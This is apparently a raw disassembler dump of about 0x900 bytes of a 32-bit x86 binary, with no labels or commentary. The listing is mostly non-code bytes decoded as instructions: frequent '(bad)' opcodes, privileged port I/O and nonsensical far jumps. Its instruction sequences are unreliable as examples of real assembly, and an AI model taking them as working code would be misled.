  405063:	sti    
  405064:	sar    edi,1
  405066:	(bad)  
  405067:	mov    ch,0xb4
  405069:	lock out dx,al
  40506b:	fld    QWORD PTR [edx]
  40506d:	mov    esi,0xe903fad6
  405072:	aam    0xdb
  405074:	clc    
  405075:	push   es
  405076:	fucomp st(7)
  405078:	repnz lock rcr esp,0xe2
  40507d:	iret   
  40507e:	(bad)  
  40507f:	cli    
  405080:	test   al,0xb1
  405082:	rcl    ah,0xd9
  405085:	cld    
  405086:	jmp    0xfbfc:0xedd1d2d9
  40508d:	aad    0xc7
  40508f:	loopne 0x405087
  405091:	rol    eax,0xfd
  405094:	or     DWORD PTR [ecx],ecx
  405096:	loopne 0x405079
  405098:	add    DWORD PTR [edi+edx*8-0x380e4224],ebp
  40509f:	ror    bh,1
  4050a1:	hlt    
  4050a2:	iret   
  4050a3:	(bad)  
  4050a5:	in     eax,0xff
  4050a7:	repnz cmc 
  4050a9:	aad    0xd4
  4050ab:	repz rcr dl,1
  4050ae:	xlat   BYTE PTR ds:[ebx]
  4050af:	hlt    
  4050b0:	(bad)  
  4050b2:	cld    
  4050b3:	fmul   DWORD PTR [esi]
  4050b5:	or     dh,bl
  4050b7:	jmp    0xc50214ae
  4050bc:	shl    eax,0xd4
  4050bf:	out    dx,eax
  4050c0:	cli    
  4050c1:	into   
  4050c2:	mov    dl,0xb5
  4050c4:	fbstp  TBYTE PTR [ecx+ecx*8-0x2fff2633]
  4050cb:	add    esi,ebp
  4050cd:	rol    BYTE PTR [edx],0xf4
  4050d0:	cli    
  4050d1:	dec    DWORD PTR [ebx]
  4050d3:	aad    0xbc
  4050d5:	add    eax,0xbff80edd
  4050da:	fdiv   st,st(0)
  4050dc:	lds    esi,FWORD PTR [ecx-0x292d0a4d]
  4050e2:	out    dx,al
  4050e3:	in     eax,0xcb
  4050e5:	mov    bh,0xd5
  4050e7:	xlat   BYTE PTR ds:[ebx]
  4050e8:	int    0xf0
  4050ea:	cmc    
  4050eb:	out    0xbd,al
  4050ed:	cli    
  4050ee:	(bad)  
  4050ef:	bnd ret 
  4050f1:	out    0xe1,al
  4050f3:	push   cs
  4050f4:	iret   
  4050f5:	out    dx,al
  4050f6:	enter  0x11e7,0xee
  4050fa:	loop   0x4050c9
  4050fc:	retf   0xeee3
  4050ff:	div    BYTE PTR [ebp-0x1b4e512a]
  405105:	(bad)  
  405106:	(bad)  
  405107:	cli    
  405108:	in     al,dx
  405109:	loopne 0x4050ea
  40510b:	loop   0x4050c9
  40510d:	rol    dl,0x1
  405110:	loope  0x405108
  405112:	add    esp,eax
  405114:	fimul  DWORD PTR [ebp*8-0x1823ff31]
  40511b:	loopne 0x40510b
  40511d:	mov    esp,0xead1face
  405122:	out    0xfe,al
  405124:	xlat   BYTE PTR ds:[ebx]
  405125:	neg    bh
  405127:	mov    esp,0xfcdfeeff
  40512c:	rol    DWORD PTR [esi],0xb
  40512f:	aad    0xc7
  405131:	test   DWORD PTR ds:0xac3c5f9,0xf7e9dc0c
  40513b:	faddp  st(2),st
  40513d:	(bad)  
  40513e:	imul   dl
  405140:	aam    0xf1
  405142:	retf   
  405143:	mov    ebx,0xcfb2edfa
  405148:	fild   WORD PTR [ecx]
  40514a:	int3   
  40514b:	shl    ebp,1
  40514d:	cld    
  40514e:	jecxz  0x40513a
  405150:	sar    ebx,1
  405152:	loopne 0x405155
  405154:	cld    
  405155:	loopne 0x405142
  405157:	adc    ebp,edi
  405159:	loope  0x40513b
  40515b:	ror    dl,0xea
  40515e:	shl    DWORD PTR [eax-0x3a294f0b],cl
  405164:	fdiv   st,st(3)
  405166:	fsincos 
  405168:	ret    0xf6e9
  40516b:	cmc    
  40516c:	out    dx,al
  40516d:	rol    ah,0xc1
  405170:	retf   
  405171:	stc    
  405172:	xlat   BYTE PTR ds:[ebx]
  405173:	retf   0xcdd5
  405176:	cld    
  405177:	dec    al
  405179:	(bad)  
  40517a:	scas   al,BYTE PTR es:[edi]
  40517b:	test   eax,0xc3d2bde5
  405180:	mov    al,0xb9
  405183:	in     al,0xb5
  405185:	rol    ah,1
  405187:	lock lock add esp,ebp
  40518b:	in     al,dx
  40518c:	ret    0x6d4
  40518f:	ffreep st(6)
  405191:	fdivr  st,st(2)
  405193:	jmp    0x405192
  405195:	add    edi,ecx
  405197:	fdivp  st(1),st
  405199:	rcr    esi,1
  40519b:	in     eax,dx
  40519c:	(bad)
  40519f:	mov    ah,0xc8
  4051a1:	shl    DWORD PTR [edx-0xf32001c],1
  4051a7:	aam    0xea
  4051a9:	fchs   
  4051ab:	mov    esp,0x3d9f0dd
  4051b0:	or     edx,esp
  4051b2:	add    al,0xd8
  4051b4:	fcmovnb st,st(5)
  4051b6:	stc    
  4051b7:	or     al,0xe4
  4051b9:	repz (bad) 
  4051bc:	test   ch,0xef
  4051bf:	lods   al,BYTE PTR ds:[esi]
  4051c0:	repz aam 0xbb
  4051c3:	retf   0xf7f3
  4051c6:	clc    
  4051c7:	repnz into 
  4051c9:	aam    0xef
  4051cb:	fldz   
  4051cd:	xlat   BYTE PTR ds:[ebx]
  4051ce:	add    ebx,eax
  4051d0:	(bad)  
  4051d1:	loopne 0x4051b5
  4051d3:	std    
  4051d4:	add    bl,dh
  4051d6:	stc    
  4051d7:	cli    
  4051d8:	shl    ah,0xe3
  4051db:	mov    ebp,0xb3c0bdef
  4051e0:	mov    ah,0xf1
  4051e2:	mov    dh,0xd8
  4051e4:	dec    dl
  4051e6:	out    dx,al
  4051e7:	mov    cl,0xfd
  4051e9:	mov    ebp,0xfde0d4c0
  4051ee:	add    ecx,esi
  4051f0:	mov    esp,0xe900d0dc
  4051f5:	in     al,0xdc
  4051f7:	in     eax,dx
  4051f8:	leave  
  4051f9:	jmp    0xa9d2:0xe9ead3dc
  405200:	retf   0xefe9
  405203:	(bad)  
  405204:	fcmovbe st,st(1)
  405206:	int3   
  405207:	fcmovnu st,st(3)
  405209:	mov    ebx,0xbdd9fad9
  40520e:	icebp  
  40520f:	mul    ebx
  405211:	in     al,0xff
  405213:	add    dl,bh
  405215:	clc    
  405216:	enter  0xd3e0,0xe1
  40521a:	mov    dl,0xd2
  40521c:	leave  
  40521d:	rol    dl,cl
  40521f:	ror    ah,cl
  405221:	mov    ebx,0xd7d2e4f0
  405226:	int    0xb5
  405228:	fstp   st(3)
  40522a:	lock mov esi,0xf9f901d6
  405230:	hlt    
  405231:	retf   
  405232:	cmc    
  405233:	aad    0xfb
  405235:	clc    
  405236:	add    al,0xdb
  405238:	leave  
  405239:	shr    BYTE PTR [ebx+eax*8-0xc18231e],1
  405240:	rcl    dh,cl
  405242:	out    dx,al
  405243:	mov    ebx,0xbbfab8ee
  405248:	repz shl dl,cl
  40524b:	mov    eax,0x1ebdaec
  405250:	mov    esi,0xc702c7c4
  405256:	push   cs
  405257:	out    0xe3,al
  405259:	test   eax,0xeac8e8f1
  40525e:	aad    0xb6
  405260:	jmp    0x40522d
  405262:	call   0xbf113937
  405267:	lock fucom st(1)
  40526a:	mov    edi,0xc1bec7bf
  40526f:	or     eax,DWORD PTR [edi]
  405271:	jecxz  0x40524b
  405273:	stc    
  405274:	or     eax,0x3d3cceb
  405279:	test   al,0xbe
  40527b:	retf   
  40527c:	in     eax,dx
  40527d:	retf   
  40527e:	hlt    
  40527f:	ret    0xc9e0
  405282:	fdivr  st,st(3)
  405284:	mov    eax,0xc8e9e8bf
  405289:	mov    esi,0xc0e3f302
  40528e:	lock add ebx,ecx
  405291:	aad    0xff
  405293:	shl    esi,0xe9
  405296:	aam    0xec
  405298:	fsub   st,st(0)
  40529a:	mul    esp
  40529c:	mov    bl,0xad
  40529e:	enter  0xf2c9,0xef
  4052a2:	repnz push DWORD PTR [eax-0xa0b0248]
  4052a9:	out    dx,eax
  4052aa:	cli    
  4052ab:	(bad)  
  4052ac:	(bad)  
  4052ad:	fsub   st,st(1)
  4052af:	push   es
  4052b0:	aam    0xe0
  4052b2:	neg    ah
  4052b4:	paddw  mm7,mm1
  4052b7:	loopne 0x405283
  4052b9:	jmp    0xb3cd:0xd2c2e6cc
  4052c0:	shl    ah,1
  4052c2:	in     al,0xcf
  4052c4:	int3   
  4052c5:	(bad)  
  4052c6:	jmp    0x42d5694
  4052cb:	in     al,dx
  4052cc:	push   es
  4052cd:	push   es
  4052ce:	(bad)  
  4052d0:	pop    es
  4052d1:	mul    dl
  4052d3:	out    dx,eax
  4052d4:	jmp    0x632db
  4052d9:	repz lds ebp,FWORD PTR [edi-0x38493f3f]
  4052e0:	(bad)  
  4052e1:	lds    esi,FWORD PTR [eax-0x3148372c]
  4052e7:	leave  
  4052e8:	mov    eax,0x2e6cecc
  4052ed:	fcmovb st,st(4)
  4052ef:	jecxz  0x4052c1
  4052f1:	sti    
  4052f2:	(bad)  
  4052f3:	(bad)  
  4052f5:	ret    
  4052f6:	into   
  4052f7:	loop   0x4052f6
  4052f9:	out    0xeb,al
  4052fb:	out    0xd6,al
  4052fd:	mov    ebp,0xcbc4b1e0
  405302:	jmp    0x4052fb
  405304:	(bad)  
  405305:	cld    
  405306:	mov    edx,0xe8c2e8b5
  40530b:	mov    ebx,0x3e4f7fa
  405311:	cmc    
  405312:	out    0xfa,eax
  405314:	jmp    0xadbe:0xe1ffddcd
  40531b:	jmp    0x4052d0
  40531d:	ror    bh,1
  40531f:	mov    ch,0xd4
  405321:	call   0xccfa081a
  405326:	jmp    0xc8ff441d
  40532b:	ret    0x2f9
  40532e:	fdivp  st(6),st
  405330:	jecxz  0x4052fd
  405332:	add    ah,al
  405334:	mov    esp,0x2dc0efd
  405339:	lods   al,BYTE PTR ds:[esi]
  40533a:	les    edi,FWORD PTR [ebp-0x1a334e3d]
  405340:	leave  
  405341:	enter  0xccb4,0xac
  405345:	aam    0xdd
  405347:	neg    ebp
  405349:	out    dx,al
  40534a:	sar    BYTE PTR [edi-0x14190513],1
  405350:	add    al,dl
  405352:	enter  0xc5d5,0x4
  405356:	fimul  DWORD PTR [edx]
  405358:	inc    dh
  40535a:	mov    esp,0xcbf5e2e3
  40535f:	enter  0xe6f1,0xf1
  405363:	jmp    0x405355
  405365:	(bad)  
  405366:	jmp    0x405343
  405368:	std    
  405369:	loopne 0x405324
  40536b:	aam    0xd6
  40536d:	sti    
  40536e:	div    edi
  405370:	add    BYTE PTR [ecx],al
  405372:	(bad)  
  405374:	(bad)  
  405375:	fmulp  st(5),st
  405377:	int3   
  405378:	repz in eax,dx
  40537a:	lods   eax,DWORD PTR ds:[esi]
  40537b:	mov    edi,0xdaf5e3ef
  405380:	mov    bl,0xb4
  405382:	sar    dh,1
  405384:	(bad)  
  405385:	out    dx,al
  405386:	int3   
  405387:	mov    ebp,0xd5d8deee
  40538c:	add    edi,DWORD PTR [esi-0x3e0706f5]
  405392:	out    0xd7,eax
  405394:	loope  0x4053a0
  405396:	fild   WORD PTR [ebx]
  405398:	or     eax,0xc3e3cbee
  40539d:	in     al,dx
  40539e:	repz mov bh,0xd0
  4053a1:	fcmovu st,st(2)
  4053a3:	idiv   BYTE PTR [edx-0x4b2d2234]
  4053a9:	ror    eax,1
  4053ab:	mul    dh
  4053ad:	pop    es
  4053ae:	fucomip st,st(3)
  4053b0:	loope  0x405379
  4053b2:	loope  0x405398
  4053b4:	fstp   st(5)
  4053b6:	or     ebx,ecx
  4053b8:	fdivr  QWORD PTR [edi-0x3430343c]
  4053be:	ror    ch,0xe6
  4053c1:	(bad)  
  4053c2:	push   eax
  4053c4:	leave  
  4053c5:	mov    edi,0xc8dafcea
  4053ca:	ffreep st(0)
  4053cc:	sti    
  4053cd:	loope  0x4053ac
  4053cf:	add    esi,ecx
  4053d1:	mov    edi,0xf40afaca
  4053d6:	out    0xda,eax
  4053d8:	fild   QWORD PTR [eax-0x2e371456]
  4053de:	mov    bl,0xb2
  4053e0:	in     al,0xd5
  4053e2:	clc    
  4053e3:	idiv   dh
  4053e5:	shr    ch,cl
  4053e7:	sar    DWORD PTR [ebp-0x2a41281f],1
  4053ed:	mov    ebx,0xe7d2b906
  4053f2:	rol    DWORD PTR [esp+eax*8],0x7
  4053f6:	or     al,0xe9
  4053f8:	fmulp  st(4),st
  4053fa:	stos   BYTE PTR es:[edi],al
  4053fb:	int    0xe9
  4053fd:	(bad)  
  4053fe:	(bad)  
  4053ff:	jmp    0x4053e9
  405401:	les    esi,FWORD PTR [ecx-0x37320d0f]
  405407:	iret   
  405408:	fadd   st,st(1)
  40540a:	add    DWORD PTR [ebp-0x1d392d27],esi
  405410:	(bad)  
  405412:	(bad)
  405415:	int    0xcc
  405417:	(bad)  
  405418:	cli    
  405419:	out    dx,eax
  40541a:	mov    ebp,0xebd2d7d0
  40541f:	out    dx,eax
  405420:	fcmove st,st(6)
  405422:	imul   esi
  405424:	aam    0xd9
  405426:	fcmovbe st,st(0)
  405428:	mov    al,0xed
  40542a:	add    esi,edi
  40542c:	mov    edi,0xe4cbfbf2
  405431:	shl    ebp,0x5
  405434:	fild   WORD PTR [ebx]
  405436:	add    al,0x2
  405438:	jmp    FWORD PTR [edi-0x3b42333e]
  40543e:	mov    bh,0xd1
  405440:	rcr    cl,1
  405442:	in     eax,dx
  405443:	jmp    0xdfcf:0xbcfbc9d0
  40544a:	aam    0xf7
  40544c:	rol    BYTE PTR [eax+edx*8],0x3
  405450:	fsub   st,st(6)
  405452:	neg    eax
  405454:	jmp    0xe8d0:0xede9d808
  40545b:	shl    BYTE PTR [edx-0x36113a30],1
  405461:	mov    dh,0xf5
  405463:	(bad)  
  405465:	retf   0xe3cb
  405468:	sar    DWORD PTR [eax-0x384b0e34],1
  40546e:	out    0xbc,al
  405470:	cld    
  405471:	loop   0x40547b
  405473:	(bad)  
  405475:	bswap  eax
  405477:	(bad)  
  405478:	out    dx,al
  405479:	in     al,0xe8
  40547b:	iret   
  40547c:	shl    DWORD PTR [ebx-0x4151d39],cl
  405482:	aam    0xb1
  405484:	repz clc 
  405486:	jecxz  0x405465
  405488:	add    ebp,ebp
  40548a:	lock sti 
  40548c:	int    0xdf
  40548e:	shl    cl,cl
  405490:	retf   
  405491:	fucomi st,st(0)
  405493:	or     bl,cl
  405495:	push   cs
  405496:	(bad)  
  405498:	in     eax,0xc8
  40549a:	mov    bl,0xb0
  40549c:	in     al,dx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	shr    BYTE PTR [ebp-0x4a392c2e],cl
  4054a4:	repz jmp 0x405486
  4054a7:	into   
  4054a8:	repz mov ebp,0xc5d9e2be
  4054ae:	cli    
  4054af:	fdiv   st(0),st
  4054b1:	not    ebp
  4054b3:	or     eax,ebx
  4054b5:	in     eax,0xd8
  4054b7:	or     bl,ch
  4054b9:	loopne 0x405468
  4054bb:	loop   0x40548c
  4054bd:	shr    DWORD PTR [ebp-0x2f3e050b],1
  4054c3:	hlt    
  4054c4:	into   
  4054c5:	mov    edx,0xb7d4c3c4
  4054ca:	loope  0x40549b
  4054cc:	xlat   BYTE PTR ds:[ebx]
  4054cd:	in     eax,dx
  4054ce:	add    dh,bh
  4054d0:	in     eax,0xd6
  4054d2:	(bad)  
  4054d3:	jecxz  0x4054b4
  4054d5:	iret   
  4054d6:	push   es
  4054d7:	dec    bh
  4054d9:	test   eax,0xe4d6c3cd
  4054de:	repz fcmove st,st(2)
  4054e1:	imul   bl
  4054e3:	lods   eax,DWORD PTR ds:[esi]
  4054e4:	test   bh,0xee
  4054e7:	fucomip st,st(7)
  4054e9:	fistp  QWORD PTR [edi-0x232418fa]
  4054ef:	(bad)  
  4054f0:	(bad)  
  4054f2:	rcr    ebx,0xc5
  4054f5:	out    dx,eax
  4054f6:	push   cs
  4054f7:	fcmovne st,st(4)
  4054f9:	mov    eax,0xe7ede5ed
  4054fe:	shl    ebx,0xd9
  405501:	(bad)  
  405502:	leave  
  405503:	(bad)  
  405504:	lods   al,BYTE PTR ds:[esi]
  405505:	lock enter 0xd4c8,0xff
  40550a:	int3   
  40550b:	(bad)  
  40550c:	aad    0xf7
  40550e:	clc    
  40550f:	stc    
  405510:	push   es
  405511:	lds    eax,FWORD PTR [ebx]
  405513:	out    0xfd,eax
  405515:	out    0xa,eax
  405517:	jmp    0xc40d22fd
  40551c:	lock scas al,BYTE PTR es:[edi]
  40551e:	fdiv   st(2),st
  405520:	aad    0xd4
  405522:	ror    ch,cl
  405524:	retf   0xf2e4
  405527:	mov    ah,0xfc
  405529:	icebp  
  40552a:	pop    es
  40552b:	mov    eax,0xc5d0f1fd
  405530:	fild   DWORD PTR [edx]
  405532:	sar    al,0xc9
  405535:	jmp    0xa9e8:0xd9e80101
  40553c:	scas   eax,DWORD PTR es:[edi]
  40553d:	jmp    0x405522
  40553f:	(bad)  
  405540:	call   0xbb0c2e12
  405545:	mov    dh,0xb6
  405547:	jmp    0x3d174d
  40554c:	(bad)  
  40554e:	add    cl,BYTE PTR [ebx]
  405550:	mul    dh
  405552:	(bad)  
  405553:	in     eax,0x4
  405555:	pminub mm1,QWORD PTR [ecx]
  405558:	add    ch,ch
  40555a:	leave  
  40555b:	loopne 0x40554f
  40555d:	repnz int3 
  40555f:	aam    0xda
  405561:	aad    0xc0
  405563:	(bad)  
  405564:	out    dx,eax
  405565:	lock fstp TBYTE PTR [edi-0x2b1c2a23]
  40556c:	fcomi  st,st(1)
  40556e:	int3   
  40556f:	mov    esp,0xd6c2cbd2
  405574:	loopne 0x405573
  405576:	add    ebx,esp
  405578:	add    eax,0xcae0d2ea
  40557d:	scas   eax,DWORD PTR es:[edi]
  40557e:	mov    ah,0xc5
  405580:	(bad)  
  405581:	int    0xc9
  405583:	mov    cl,0xe6
  405585:	neg    esp
  405587:	push   eax
  405589:	leave  
  40558a:	mov    ecx,0xc1c0d8ed
  40558f:	hlt    
  405590:	fsubr  st(4),st
  405592:	jmp    0xce5:0xfff4dce8
  405599:	enter  0xb3e8,0xe6
  40559d:	mov    ebp,0xd9f7cdf6
  4055a2:	out    0xf0,al
  4055a4:	mov    al,0xd5
  4055a6:	hlt    
  4055a7:	stc    
  4055a8:	rol    cl,1
  4055aa:	int3   
  4055ab:	hlt    
  4055ac:	div    cl
  4055ae:	lock cli 
  4055b0:	cld    
  4055b1:	retf   0x6ea
  4055b4:	cmc    
  4055b5:	out    dx,al
  4055b6:	in     al,0xfe
  4055b8:	fcmove st,st(6)
  4055ba:	in     al,dx
  4055bb:	test   esi,0xd4e3d3f1
  4055c1:	in     eax,0xfb
  4055c3:	retf   
  4055c4:	not    al
  4055c6:	ror    bl,cl
  4055c8:	aad    0xdd
  4055ca:	fcmovnb st,st(7)
  4055cc:	sar    dl,0xe1
  4055cf:	fdivr  st,st(1)
  4055d1:	(bad)  
  4055d2:	jmp    0xe2302ac2
  4055d7:	fsubp  st(7),st
  4055d9:	ret    0xe5e9
  4055dc:	jmp    0xedf6:0xa8e9b6ce
  4055e3:	mov    dh,0xbb
  4055e5:	(bad)  
  4055e6:	xlat   BYTE PTR ds:[ebx]
  4055e7:	jmp    0xc5fc:0xf5fbd3c8
  4055ee:	cmc    
  4055ef:	fld    DWORD PTR [eax]
  4055f1:	or     al,dh
  4055f3:	push   cs
  4055f4:	out    dx,eax
  4055f5:	fmul   DWORD PTR [ebx]
  4055f7:	(bad)  
  4055f8:	adc    DWORD PTR [eax-0x33292923],edi
  4055fe:	in     al,dx
  4055ff:	(bad)  
  405600:	(bad)  
  405601:	in     eax,0xc6
  405603:	int    0xd5
  405605:	repnz neg edi
  405608:	mov    esi,0xf2f2b6d2
  40560d:	(bad)  
  40560f:	out    0xf4,al
  405611:	add    bl,ch
  405613:	iret   
  405614:	pop    es
  405615:	fiadd  WORD PTR [edx+ebp*8]
  405618:	fcmovbe st,st(3)
  40561a:	mov    eax,0xc9ebc1af
  40561f:	jmp    0xecd8:0xdacbb2d7
  405626:	rcr    edi,1
  405628:	call   0x2132a04
  40562d:	xlat   BYTE PTR ds:[ebx]
  40562e:	out    0xf9,eax
  405630:	jecxz  0x4055f4
  405632:	out    0xc7,eax
  405634:	in     eax,0xca
  405636:	add    al,0xf3
  405638:	inc    esp
  40563a:	mov    bl,0xf1
  40563c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40563d:	call   0xd3363ef2
  405642:	out    dx,al
  405643:	into   
  405644:	mov    edx,0xd2edf5c9
  405649:	rcl    ebp,1
  40564b:	aad    0xdb
  40564d:	rcr    cl,0xdb
  405650:	ret    0xe6c4
  405653:	add    ebp,ebx
  405655:	into   
  405656:	fld1   
  405658:	shr    ebx,cl
  40565a:	lock repnz jmp 0xe5c4:0xb0c5e8bc
  405663:	jmp    0xcc3a1254
  405668:	icebp  
  405669:	out    dx,eax
  40566a:	lock rcr bh,0xd3
  40566e:	jmp    edi
  405670:	ret    
  405671:	(bad)  
  405673:	fsub   st(2),st
  405675:	push   cs
  405676:	loop   0x405674
  405678:	(bad)  
  405679:	fcomip st,st(3)
  40567b:	fnstsw WORD PTR [ebx+ebp*8-0x330b303b]
  405682:	shl    esp,cl
  405684:	out    dx,eax
  405685:	fcomip st,st(6)
  405687:	(bad)  
  405689:	(bad)  
  40568a:	out    dx,eax
  40568b:	add    BYTE PTR [ebp+0x3d6d4d6],bh
  405691:	in     eax,0xef
  405693:	or     cl,cl
  405695:	or     esp,esp
  405697:	les    ecx,FWORD PTR [ebx]
  405699:	enter  0xcfcb,0xdc
  40569d:	mov    ebp,0xd1e6c9ce
  4056a2:	sar    dl,1
  4056a4:	fdivr  DWORD PTR [ebx-0x7124627]
  4056aa:	xlat   BYTE PTR ds:[ebx]
  4056ab:	sti    
  4056ac:	cld    
  4056ad:	shl    al,0xeb
  4056b0:	jmp    0x40567b
  4056b2:	call   0xc24d3377
  4056b7:	in     eax,dx
  4056b8:	or     al,0xe9
  4056ba:	jmp    0xc2b0:0xb3b5beea
  4056c1:	clc    
  4056c2:	call   0xb5fc10c2
  4056c7:	cli    
  4056c8:	fnstsw WORD PTR [eax-0x1c223c26]
  4056ce:	fisttp DWORD PTR [edx]
  4056d0:	retf   
  4056d1:	fmul   QWORD PTR [ecx]
  4056d3:	jecxz  0x4056ce
  4056d5:	out    0xeb,eax
  4056d7:	retf   0xf1e7
  4056da:	lock jmp 0xb6ed:0xfbebebbd
  4056e2:	(bad)  
  4056e3:	(bad)  
  4056e4:	push   ecx
  4056e6:	mov    esi,0xf8d1da
  4056eb:	add    bl,cl
  4056ed:	out    0xda,eax
  4056ef:	or     ah,bh
  4056f1:	shr    bl,0xcb
  4056f4:	fdiv   st(4),st
  4056f6:	jmp    0xcc0355f9
  4056fb:	shr    eax,0xe5
  4056fe:	in     al,dx
  4056ff:	enter  0xcee9,0xb8
  405703:	(bad)  
  405704:	leave  
  405705:	jmp    0xe2cd:0x1ded6ee
  40570c:	(bad)  
  40570d:	(bad)  
  40570f:	div    dh
  405711:	fadd   st(6),st
  405713:	fyl2xp1 
  405715:	jmp    0xcf534afd
  40571a:	mov    bl,0xc4
  40571c:	aad    0xc2
  40571e:	jecxz  0x4056ed
  405720:	loop   0x4056dd
  405722:	jmp    0xba324a12
  405727:	ret    
  405728:	add    esi,edi
  40572a:	repnz sar DWORD PTR [edi+0x7c60bd7],0xc0
  405732:	(bad)
  405735:	(bad)  
  405736:	push   cs
  405737:	loopne 0x405706
  405739:	fcom   st(2)
  40573b:	in     al,0xb0
  40573d:	mov    dl,0xc3
  405740:	int    0xe6
  405742:	hlt    
  405743:	retf   
  405744:	lock retf 0xd6be
  405748:	ror    esi,cl
  40574a:	fdivr  DWORD PTR [eax+edi*8-0x3a240b21]
  405751:	mov    edi,0xbfce0c6
  405756:	in     eax,dx
  405757:	pop    es
  405758:	shl    esp,cl
  40575a:	out    dx,eax
  40575b:	rcl    ch,0xc7
  40575e:	in     eax,0xd6
  405760:	fcmove st,st(2)
  405762:	(bad)  
  405763:	mov    al,0xb5
  405765:	fnsave [edi+edi*4-0x1005071e]
  40576c:	sar    edx,0xc2
  40576f:	add    ebx,ecx
  405771:	push   es
  405772:	add    eax,edi
  405774:	or     edi,eax
  405776:	retf   
  405777:	int3   
  405778:	out    0xca,al
  40577a:	icebp  
  40577b:	in     eax,dx
  40577c:	icebp  
  40577d:	not    bl
  40577f:	aad    0xc1
  405781:	leave  
  405782:	int3   
  405783:	cli    
  405784:	leave  
  405785:	in     eax,0xb4
  405787:	cld    
  405788:	ror    eax,cl
  40578a:	clc    
  40578b:	fdiv   st,st(4)
  40578d:	add    eax,DWORD PTR [edi]
  40578f:	xlat   BYTE PTR ds:[ebx]
  405790:	idiv   esi
  405792:	std    
  405793:	add    eax,0xcd07e905
  405798:	jecxz  0x405744
  40579a:	int3   
  40579b:	retf   
  40579c:	iret   
  40579d:	lods   al,BYTE PTR ds:[esi]
  40579e:	mov    dl,0xe9
  4057a0:	loope  0x405774
  4057a2:	xlat   BYTE PTR ds:[ebx]
  4057a3:	in     eax,dx
  4057a4:	fcmovbe st,st(2)
  4057a6:	mov    esp,0xf0f7c2fa
  4057ab:	sti    
  4057ac:	not    esp
  4057ae:	(bad)
  4057b1:	jmp    0x40578d
  4057b3:	fmulp  st(6),st
  4057b5:	in     al,dx
  4057b6:	add    bl,bh
  4057b8:	retf   0xaaef
  4057bb:	rcr    esi,1
  4057bd:	mov    ebp,0xb9d3d3b4
  4057c2:	loopne 0x4057ad
  4057c4:	int    0xf0
  4057c6:	(bad)  
  4057c8:	std    
  4057c9:	xlat   BYTE PTR ds:[ebx]
  4057ca:	repnz mov ebp,0xdb04f7fd
  4057d0:	ret    0xe1d1
  4057d3:	std    
  4057d4:	in     eax,dx
  4057d5:	out    0xf3,eax
  4057d7:	sti    
  4057d8:	fbstp  TBYTE PTR [ebx-0x2c313710]
  4057de:	repnz (bad) 
  4057e0:	jmp    0x405791
  4057e2:	in     eax,dx
  4057e3:	(bad)  
  4057e4:	mov    ah,0xbb
  4057e6:	aad    0xee
  4057e8:	repz lock repz cli 
  4057ec:	ret    0xfcec
  4057ef:	jecxz  0x4057f0
  4057f1:	or     bh,BYTE PTR [esi-0x35323535]
  4057f7:	or     eax,DWORD PTR [ebx+esi*8]
  4057fa:	int    0xf0
  4057fc:	mov    al,0xf3
  4057fe:	in     al,dx
  4057ff:	lods   eax,DWORD PTR ds:[esi]
  405800:	mov    bl,0xf7
  405802:	repnz sar al,cl
  405805:	sti    
  405806:	sar    ah,cl
  405808:	shl    eax,cl
  40580a:	iret   
  40580b:	cld    
  40580c:	sti    
  40580d:	add    ch,bh
  40580f:	rcr    bl,0xc0
  405812:	in     eax,0xf5
  405814:	aam    0x8
  405816:	add    cl,BYTE PTR [edx]
  405818:	loop   0x4057cb
  40581a:	loope  0x4057ff
  40581c:	shr    BYTE PTR [esi-0x44451f0d],0xb9
  405823:	call   0xf40f28e6
  405828:	loop   0x40581c
  40582a:	in     al,dx
  40582b:	push   es
  40582c:	repz shl edi,1
  40582f:	or     edi,esi
  405831:	hlt    
  405832:	loop   0x40581f
  405834:	pmulhuw mm3,mm7
  405837:	in     eax,0xcc
  405839:	in     al,dx
  40583a:	shr    ch,1
  40583c:	ret    
  40583d:	rcl    ebp,cl
  40583f:	aam    0xea
  405841:	icebp  
  405842:	sti    
  405843:	mov    bh,0xd1
  405845:	hlt    
  405846:	aam    0xd9
  405848:	fcomip st,st(6)
  40584a:	std    
  40584b:	mov    esi,0xc2dffad9
  405850:	lock or DWORD PTR [eax],eax
  405853:	jmp    0xe3e1:0x7e5ffdf
  40585a:	shl    bl,1
  40585c:	jmp    0x40583f
  40585e:	mov    cl,0xfb
  405860:	int    0xe8
  405862:	repz mov al,0xc8
  405865:	mov    ecx,0xd802cbcf
  40586a:	cmc    
  40586b:	hlt    
  40586c:	dec    ch
  40586e:	fst    st(5)
  405870:	push   es
  405871:	mov    BYTE PTR [edx],0xda
  405874:	in     eax,0xdf
  405876:	(bad)  
  405878:	add    BYTE PTR [ebp-0x1c3d1d1b],ch
  40587e:	mov    al,0xe2
  405880:	xlat   BYTE PTR ds:[ebx]
  405881:	out    0xed,al
  405883:	int3   
  405884:	fxam   
  405886:	(bad)  
  405887:	add    bh,BYTE PTR [ebp+0x7efd9d8]
  40588d:	cli    
  40588e:	not    ebx
  405890:	shl    bh,1
  405892:	call   0x83b5b9e
  405897:	pmaxub mm1,mm2
  40589a:	shl    dh,1
  40589c:	ret    
  40589d:	stos   DWORD PTR es:[edi],eax
  40589e:	mov    bh,0xa9
  4058a0:	sti    
  4058a1:	icebp  
  4058a2:	shl    BYTE PTR [eax-0x36100d0b],cl
  4058a8:	mov    esp,0xc7ced5de
  4058ad:	mov    esp,0xebfe04e2
  4058b2:	xlat   BYTE PTR ds:[ebx]
  4058b3:	add    cl,al
  4058b5:	loopne 0x4058be
  4058b7:	add    ah,al
  4058b9:	stos   BYTE PTR es:[edi],al
  4058ba:	in     eax,0xcc
  4058bc:	jecxz  0x405885
  4058be:	int    0xf5
  4058c0:	iret   
  4058c1:	shl    edx,1
  4058c3:	rcl    dh,1
  4058c5:	cld    
  4058c6:	icebp  
  4058c7:	(bad)  
  4058c8:	int3   
  4058c9:	(bad)  
  4058cb:	mov    esp,0x7c107
  4058d0:	hlt    
  4058d1:	hlt    
  4058d2:	loop   0x40589e
  4058d4:	jecxz  0x4058cf
  4058d6:	(bad)  
  4058d7:	or     al,0x9
  4058d9:	fxch   st(7)
  4058db:	jmp    0xf43105ca
  4058e0:	(bad)
  4058e3:	in     eax,dx
  4058e4:	aam    0xf7
  4058e6:	not    dl
  4058e8:	loope  0x4058c0
  4058ea:	mov    esp,0x6f8edd6
  4058ef:	loope  0x4058d2
  4058f1:	fst    st(5)
  4058f3:	pop    es
  4058f4:	(bad)  
  4058f6:	repz or eax,0xaeccaac8
  4058fc:	icebp  
  4058fd:	retf   0xc8f0
  405900:	(bad)  
  405901:	out    dx,eax
